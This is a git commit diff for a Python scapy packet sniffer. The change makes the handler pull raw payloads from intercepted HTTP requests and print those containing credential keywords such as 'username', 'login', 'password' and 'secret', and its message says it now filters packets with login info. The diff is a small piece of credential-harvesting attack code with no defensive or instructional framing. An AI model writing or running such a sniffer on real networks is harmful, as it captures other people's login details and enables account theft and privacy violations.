3df1c6ca943790d993af87ad90c33bf0dad99b10
Angelo <madhav1004@icloud.com>
2021-01-06 18:09:53 +0530

    It now filters all packages with login info and http requests.

--- main.py
+++ main.py
@@ -9,11 +9,18 @@ def sniff(interface):
 def handle_packets(packet):
     if http.HTTPRequest in packet:
         # http packet.
-        print(packet)
-    elif scapy.TCP in packet:
-        if packet[scapy.TCP].dport == 443:
-            # ssl packet.
-            print(packet)
+        if scapy.Raw in packet:
+            load = str(packet[scapy.Raw].load)
+            keywords = ['username', 'user', 'login', 'register', 'sign-up', 'signUp', 'password', 'pass', 'secret']
+
+            for keyword in keywords:
+                if keyword in load:
+                    print(load)
+                    break
+    # elif scapy.TCP in packet:
+    #     if packet[scapy.TCP].dport == 443:
+    #         # ssl packet.
+    #         print('')
 
 
 def geturl(packet):
